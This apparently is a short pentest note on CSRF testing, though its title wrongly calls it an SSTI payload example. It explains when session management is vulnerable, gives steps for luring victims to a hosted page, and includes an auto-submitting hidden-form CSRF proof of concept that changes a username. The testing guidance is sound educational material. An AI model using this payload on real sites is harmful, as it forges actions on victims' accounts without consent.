All level plausible SSTI Payload Example

Audit the application to ascertain if its session management is vulnerable. If session management relies only on client-side values (information available to the browser), then the application is vulnerable. "Client-side values" refers to cookies and HTTP authentication credentials (Basic Authentication and other forms of HTTP authentication; not form-based authentication, which is an application-level authentication).

Resources accessible via HTTP GET requests are easily vulnerable, though POST requests can be automated via JavaScript and are vulnerable as well; therefore, the use of POST alone is not enough to correct the occurrence of CSRF vulnerabilities.

In case of POST, the following sample can be used.

1. Create an HTML page similar to that shown below
2. Host the HTML on a malicious or third-party site
3. Send the link for the page to the victim(s) and induce them to click it.

EXAMPLE:

<!-- csrf_poc.html -->
<html>
  <body onload="document.forms[0].submit()">
    <form method="POST" action="http://<IP>/csrflow.php">
      <input type="hidden" name="username" value="HackedbyProf">
      <input type="hidden" name="update" value="1">
    </form>
  </body>
</html>
